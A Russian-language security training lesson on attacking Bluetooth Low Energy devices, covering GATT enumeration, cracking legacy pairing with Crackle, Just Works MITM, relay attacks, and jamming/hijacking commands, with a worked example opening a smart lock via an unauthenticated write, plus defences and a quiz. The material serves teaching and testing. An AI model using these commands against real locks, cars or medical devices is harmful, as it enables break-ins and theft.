---
id: hardware-ble-deep
title: "BLE глубоко: GATT, pairing, relay"
category: hardware
parent: hardware-bluetooth
difficulty: hard
order: 1
tags: [ble, gatt, pairing, relay, bluetooth]
prerequisites: [hardware-bluetooth, hardware-rf-protocols]
useful_for:
  - "CTF-задачи категории Hardware/Radio"
  - "Пентест BLE-устройств и IoT"
  - "Аудит BLE-замков, трекеров, медгаджетов"
estimated_minutes: 55
summary: "Глубокий разбор BLE: стек и каналы, GATT-дерево, спаривание (legacy и LE Secure Connections), атаки MITM и relay, Crackle, энумерация и запись характеристик — с полным тулингом и разобранными примерами."
---

BLE (Bluetooth Low Energy) — это не «Bluetooth помедленнее», а отдельный протокол со своим стеком, канальной структурой и моделью данных. Classic Bluetooth гоняет профили вроде A2DP и SPP поверх потоковых каналов, а BLE строится вокруг концепции «атрибутов» — GATT. Для атакующего это означает: у BLE-устройства почти всегда есть понятная структура данных, которую можно перечислить и часто — прочитать или записать без всякой аутентификации. Этот урок — про то, как зайти дальше базового сниффинга: разобрать GATT-дерево, понять модель спаривания, найти слабые места и провести relay-атаку.

## Зачем этот урок

Базовый урок `hardware-bluetooth` даёт обзор: как включить адаптер, как поймать рекламу, как запустить Crackle. Здесь мы идём в глубину. Разница между «увидел BLE-устройство» и «получил контроль над BLE-замком» лежит в трёх плоскостях: понимание GATT (что за сервисы и характеристики), понимание pairing/bonding (как устроена аутентификация и где она ломается) и понимание транспорта (каналы, скачки частоты, advertising против data). Relay-атаки, которые в 2020–2023 годах сломали десятки «защищённых» умных замков, эксплуатируют именно то, что протокол проверяет подлинность, но не проверяет физическую близость. Без глубокого понимания GATT и pairing такие атаки не воспроизвести.

## Стек BLE: каналы, адреса, реклама

BLE работает в диапазоне 2.4 ГГц ISM и делит его на 40 каналов по 2 МГц: три «advertising» канала (37, 38, 39) и 37 «data» каналов. Реклама (advertising) идёт только по трём каналам, поэтому её легко поймать; данные — по остальным 37, со скачками частоты (channel hopping) по псевдослучайной последовательности, зависящей от канала и часов соединения. Именно поэтому сниффер, слушающий лишь три advertising-канала, видит «шапку» соединения, но не сам обмен.

Адреса BLE — 48-битные, как MAC, но с типами:

- `public` — жёстко прошитый в чип, IEEE-assigned;
- `random static` — задаётся устройством, два старших бита `11`;
- `random private resolvable` (RPA) — меняется каждые ~15 минут, разрешается через IRK;
- `random private non-resolvable` — просто случайный.

RPA — это privacy-механизм: устройство не должно «светить» постоянный адрес. Для сниффинга это важно: если адрес меняется, но вы не можете связать поток с устройством, вероятно, у вас нет IRK. Разрешение RPA делается через функцию AES-128: `hash = AES_IRK(prand)`, и младшие 24 бита сравниваются с адресом. Без IRK связать поток с устройством можно только по косвенным признакам — имени в рекламе, набору сервисов, паттерну рекламы.

Advertising PDU содержит поля: `AdvA` (адрес рекламодателя), `AdvData` (до 31 байта полезной нагрузки; в BLE 5 — до 255 через extended advertising) и тип PDU (`ADV_IND`, `ADV_DIRECT_IND`, `ADV_NONCONN_IND`, `ADV_SCAN_IND`, `ADV_EXT_IND`). Тип `ADV_IND` — connectable undirected; именно его вы ловите, чтобы инициировать соединение. `ADV_NONCONN_IND` не подразумевает подключения (маяки), `ADV_SCAN_IND` допускает сканирующие запросы.

## GATT: сервисы, характеристики, дескрипторы

GATT (Generic Attribute Profile) — это иерархия атрибутов, каждый из которых имеет 16-битный handle, UUID (16-битный стандартный или 128-битный кастомный), права доступа (read/write/notify) и значение.

Иерархия:

- **Service** (UUID, например `0x180F` — Battery Service);
  - **Characteristic** (UUID, например `0x2A19` — Battery Level);
    - **Descriptor** (например `0x2902` — Client Characteristic Configuration Descriptor, CCCD).

Ключевые GATT-операции:

- `Read` / `Read By Type` / `Read Blob` — чтение значения по handle или по типу UUID;
- `Write Request` / `Write Command` — запись (с подтверждением / без);
- `Notifications` / `Indications` — уведомления от устройства;
- `Find Information` / `Discover All` — перечисление атрибутов.

Права на атрибут задаются в ATT-таблице прошивки. Часто разработчик ставит `Read` и `Write` без аутентификации — тогда `nRF Connect` или `gatttool` пишет в характеристику напрямую. Именно так ломаются «умные» лампы, замки и игрушки. Обратите внимание: права бывают «encrypted only» — тогда запись требует установленного шифрования, но не обязательно аутентификации; это важное различие, потому что после Just Works шифрование есть, а аутентичности нет.

## Спаривание и bonding: legacy vs LE Secure Connections

Спаривание (pairing) устанавливает ключи; bonding — сохраняет их для последующих подключений. Есть три фазы:

1. **Phase 1** — обмен IO capabilities и выбор метода ассоциации.
2. **Phase 2** — генерация ключей (Short Term Key, STK, в legacy; Long Term Key, LTK, в LE Secure Connections).
3. **Phase 3** — распределение ключей (LTK, IRK, CSRK).

Методы ассоциации (association models):

- **Just Works** — без защиты от MITM, ключ вычисляется из открытых значений, нулевая аутентичность;
- **Passkey Entry** — 6-значный код вводится на одной стороне, отображается на другой;
- **Numeric Comparison** — обе стороны показывают 6-значное число, пользователь подтверждает;
- **Out of Band (OOB)** — ключ передаётся вне канала (NFC, QR).

Legacy pairing (BLE 4.0/4.1) использует STK = `c1(TK, rand, ...)` и уязвим к пассивному подбору: TK для Just Works равен нулю, для Passkey — 20 бит энтропии (миллион вариантов, подбирается за секунды на GPU). Инструмент **Crackle** делает именно это: перехватывает `Pairing Request/Response`, `Pairing Confirm`, `Pairing Random` и брутит TK.

LE Secure Connections (BLE 4.2+) использует ECDH (P-256), и пассивный подбор TK невозможен. Однако Just Works всё ещё уязвим к активному MITM: атакующий вклинивается и релеит. Passkey Entry и Numeric Comparison защищают при условии, что пользователь реально сверяет числа. Если устройство поддерживает Secure Connections, но понижает режим до legacy (downgrade) — это отдельная уязвимость, и её стоит проверять.

## Атаки на спаривание: MITM, Crackle, passkey

**Crackle** — классика: пассивный перехват legacy pairing и восстановление TK. Если спаривание было Just Works, TK = 0, и Crackle восстановит LTK мгновенно; для Passkey потребуется перебор 10^6 (минуты). После получения LTK можно расшифровать последующие сессии, если используется legacy encryption.

```bash
# 1) Снять трафик во время спаривания
btlejack -s
btlejack -c any -o capture.pcap
# 2) Скopмить в Crackle
crackle -i capture.pcap -o decrypted.pcap -v
# вывод при успехе:
#   TK found: 000000
#   LTK found: 4c 68 39 ...
#   Wrote decrypted.pcap
```

**MITM на Just Works** — активная атака: два адаптера (или одна плата с двумя интерфейсами) эмулируют устройство для телефона и телефон для устройства, проксируя GATT. Поскольку Just Works не аутентифицирует стороны, обе стороны примут соединение. Реализуется через `btvirt` (эмуляция контроллеров BlueZ) или две платы nRF52840.

**Passkey brute** — если passkey фиксированный (например, `000000` у дешёвых устройств), его подбирают напрямую, не перехватывая трафик. Многие устройства также не ограничивают число попыток, что делает перебор тривиальным.

## GATT-атаки: энумерация, запись, уведомления

Типовой сценарий пентеста BLE-устройства:

1. Сканирование и определение адреса и типа соединения.
2. Подключение и полная энумерация GATT.
3. Поиск характеристик с правами `Write` без аутентификации.
4. Запись в управляющие характеристики (открыть замок, изменить конфиг, сбросить пароль).
5. Подписка на notifications для наблюдения за состоянием.

Инструменты:

- **gatttool** (BlueZ) — низкоуровневый, но живой;
- **bluetoothctl** — интерактивный, с командами `menu gatt`;
- **nRF Connect** (Android/iOS) — GUI, удобен для ручного исследования;
- **Bettercap** с BLE-модулем;
- **BLEAH** (python) — для записи по всем характеристикам сразу;
- **btscanner**, **btlejack** (Micro:Bit/Adafruit), **Ubertooth One** с `ubertooth-btle`.

## Relay-атаки на BLE

Relay-атака (BLE relay) эксплуатирует то, что BLE проверяет криптографическую подлинность, но не измеряет физическую задержку или близость. Идея: жертва (владелец) и замок находятся рядом; атакующий ставит два ретранслятора — один рядом с жертвой, другой рядом с замком — и релеит весь BLE-трафик между ними, оставаясь в стороне. Поскольку сессия криптографически корректна, замок открывается.

Практическая реализация: две платы nRF52840 (например, **nRF52840 Dongle** или отладочная плата с прошивкой relay), соединённые по Wi-Fi/Ethernet, с малой задержкой. Исследователи (NCC Group, 2023) показали relay на автомобилях, умных замках и дверях. Условия успеха: задержка ретрансляции меньше таймаута протокола; соединение уже установлено или инициируется жертвой. Чем меньше connection interval и чем строже таймауты, тем сложнее relay — но многие устройства допускают задержки в десятки миллисекунд.

## Инструменты и команды

```bash
# --- BlueZ / bluetoothctl ---
hciconfig hci0 up
bluetoothctl
  [bluetooth]# scan on
  [bluetooth]# devices
  [bluetooth]# connect AA:BB:CC:DD:EE:FF
  [bluetooth]# menu gatt
  [bluetooth]# list-attributes
  [bluetooth]# select-attribute /org/bluez/hci0/dev_AA_BB_CC_DD_EE_FF/service.../char...
  [bluetooth]# read
  [bluetooth]# write 0x01
  [bluetooth]# notify on

# --- gatttool (legacy) ---
gatttool -b AA:BB:CC:DD:EE:FF -t random -I
  > connect
  > primary
  > characteristics
  > char-read-hnd 0x0016
  > char-write-req 0x0019 0100
  > char-write-cmd 0x0019 0100
  > char-read-uuid 00002a19-0000-1000-8000-00805f9b34fb

# --- btlejack ---
btlejack -d /dev/ttyACM0 -b AA:BB:CC:DD:EE:FF -s        # scan
btlejack -d /dev/ttyACM0 -b AA:BB:CC:DD:EE:FF -c any     # sniff all channels
btlejack -d /dev/ttyACM0 -b AA:BB:CC:DD:EE:FF -j         # jam
btlejack -d /dev/ttyACM0 -b AA:BB:CC:DD:EE:FF -x         # hijack connection

# --- Ubertooth ---
ubertooth-btle -f -c capture.pcap
ubertooth-btle -p -t AA:BB:CC:DD:EE:FF
ubertooth-rx -c capture.pcap

# --- Crackle ---
crackle -i capture.pcap -o out.pcap -v

# --- BLEAH (запись во все write-характеристики) ---
python bleah.py -i hci0 -e -s AA:BB:CC:DD:EE:FF

# --- Bettercap ---
sudo bettercap -eval "ble.recon on; ble.show"
```

Флаги, которые важно знать:

- `btlejack -s` scan, `-c <ch>` follow (all/37/38/39), `-o` output, `-j` jam, `-x` hijack, `-r` reset;
- `ubertooth-btle -f` follow, `-p` promiscuous, `-c` pcap, `-t` target, `-q` quiet;
- `crackle -i in -o out -v` verbose;
- `gatttool -b MAC -t random|public -I` — тип адреса частая причина «не подключается»;
- `bluetoothctl --timeout 10 scan on` — ограничить время скана.

## Разобранный пример: взлом BLE-замка

**Дано:** BLE-замок с приложением-компаньоном. Цель — открыть замок без приложения.

**Шаг 1 — сканирование.**

```bash
$ btlejack -d /dev/ttyACM0 -s
Found device: 5C:F8:21:11:22:33 (random) RSSI -42 "SmartLock"
```

Тип адреса `random` — при подключении через gatttool нужно `-t random`.

**Шаг 2 — энумерация GATT.**

```bash
$ gatttool -b 5C:F8:21:11:22:33 -t random -I
> connect
Connection successful
> primary
handle: 0x0001  uuid: 00001800-...
handle: 0x000b  uuid: 0000fff0-...   # vendor service
> characteristics
handle: 0x000e  uuid: 0000fff1-...  props: read,notify
handle: 0x0011  uuid: 0000fff2-...  props: write,write-no-response
> char-read-hnd 0x000e
Characteristic value/descriptor: 00
```

**Шаг 3 — запись в управляющую характеристику.** Характеристика `0xfff2` доступна на запись без аутентификации.

```bash
> char-write-req 0x0011 01
Characteristic value was written successfully
```

Замок щёлкает — открылся. Это классическая «no-auth write» уязвимость.

**Шаг 4 — если запись требует pairing.** Запускаем перехват во время спаривания, снимаем `capture.pcap`, гоним в Crackle. Если pairing был Just Works:

```bash
$ crackle -i capture.pcap -o dec.pcap
TK found: 000000
LTK found: 8f 3a ...
```

Далее используем LTK для расшифровки и подключения. Для LE Secure Connections — переходим к relay-атаке с двумя nRF52840.

## Edge cases и защита

- **Random vs public address.** Неверный тип адреса (`-t`) — самая частая ошибка «device not found».
- **RPA.** Если адрес меняется — ищите по IRK или ловите по рекламной нагрузке (имя, UUID).
- **Extended advertising (BLE 5).** Длинная реклама идёт на вторичных каналах; старый сниффер её не увидит.
- **Connection interval.** Большой интервал (например, 100 мс) усложняет relay из-за задержки.
- **Data Length Extension.** Устройство может уйти на большие PDU — следите за MTU.
- **Защита:** LE Secure Connections + Numeric Comparison (не Just Works), аутентифицированная запись на характеристики, ротация ключей приложения, детект relay по задержке (distance bounding), отказ от «encrypted-only без MITM-защиты».

## Частые ошибки

- Подключаться с типом адреса `public` к `random`-устройству.
- Путать bonding и pairing: без bond ключи теряются при перезагрузке.
- Сниффить только advertising-каналы и удивляться, что нет данных — данные идут по 37 data-каналам.
- Забыть, что Crackle работает только с legacy pairing.
- Игнорировать законодательство: релей и взлом чужих замков и авто — преступление. Только свой стенд.
- Считать «spoof MAC» защитой: relay-атака обходит привязку к адресу.

## Что дальше / решение

После понимания GATT и pairing переходите к:

- **практике с nRF52840** (sniffer + relay firmware);
- **BLE CTF** — эмуляция периферии через `bluetoothctl` и `btvirt`;
- **firmware-анализу** BLE-устройств (см. `hardware-firmware-extract`) — часто ключи зашиты в прошивке;
- **связке с mobile**: `mobile-android-*` для реверса приложения-компаньона и извлечения ключей.

Защита на уровне решения: включать LE Secure Connections с Numeric Comparison, требовать аутентификацию на write-характеристики, применять distance bounding и RSSI-based relay detection, ротировать ключи.

## Справочные таблицы

| Слой | Что | Пример |
|------|-----|--------|
| PHY | 40 каналов, 2 МГц | 37/38/39 = advertising |
| Link | PDU, RPA, LL control | LL_ENC_REQ |
| L2CAP | каналы, MTU | ATT, SMP |
| ATT | handle + UUID + value | 0x0016 |
| GATT | сервисы/характеристики | 0x180F, 0x2A19 |
| GAP | роли, advertising | ADV_IND |

| Атака | Условие | Инструмент |
|-------|---------|-----------|
| Сниффинг данных | нет шифрования | btlejack, Ubertooth |
| Crackle (legacy) | legacy pairing | crackle |
| MITM Just Works | нет аутентификации | 2 адаптера / btvirt |
| No-auth write | права Write | gatttool / BLEAH |
| Relay | есть сессия/жертва | 2×nRF52840 |

| Метод ассоциации | MITM-защита |
|------------------|-------------|
| Just Works | нет |
| Passkey Entry | да (если код не подбирается) |
| Numeric Comparison | да |
| OOB | да |

## Квиз

```quiz
- question: "Какой из перечисленных каналов НЕ является advertising-каналом BLE?"
  options:
    - "37"
    - "38"
    - "39"
    - "20"
  answer: 3
  explanation: "Advertising-каналы — 37, 38 и 39; канал 20 относится к data-каналам."
- question: "Что делает инструмент Crackle?"
  options:
    - "Восстанавливает TK/LTK устаревшего (legacy) BLE-спаривания из перехвата"
    - "Проводит relay-атаку между двумя платами"
    - "Эмулирует USB-устройство"
    - "Расшифровывает Bluetooth Classic A2DP"
  answer: 0
- question: "Какой метод ассоциации НЕ защищает от MITM-атаки?"
  options:
    - "Just Works"
    - "Passkey Entry"
    - "Numeric Comparison"
    - "Out of Band"
  answer: 0
- question: "Что эксплуатирует BLE relay-атака?"
  options:
    - "Отсутствие проверки физической близости при криптографически корректной сессии"
    - "Слабый пароль администратора"
    - "Переполнение буфера в GATT-сервере"
    - "SQL-инъекцию в приложении"
  answer: 0
- question: "Что означает тип адреса random private resolvable (RPA)?"
  options:
    - "Приватный разрешаемый адрес, меняющийся и разрешаемый через IRK"
    - "Публичный адрес, прошитый производителем"
    - "Статический случайный адрес, не меняющийся"
    - "Широковещательный адрес"
  answer: 0
```

## Где пригодится

- **CTF:** Hardware/Radio-задачи с BLE, GATT-эксплуатацией и восстановлением ключей.
- **Пентест IoT:** аудит умных замков, трекеров, медгаджетов, носимой электроники.
- **Bug bounty / Hardware:** отчёты по no-auth write, weak pairing, relay-уязвимостям.
- **Работа:** проектирование безопасного BLE-стека, аудит прошивок с BLE.
- **Дальше по дереву:** `hardware-rf-protocols`, `hardware-firmware-extract`, `mobile-android-frida`.
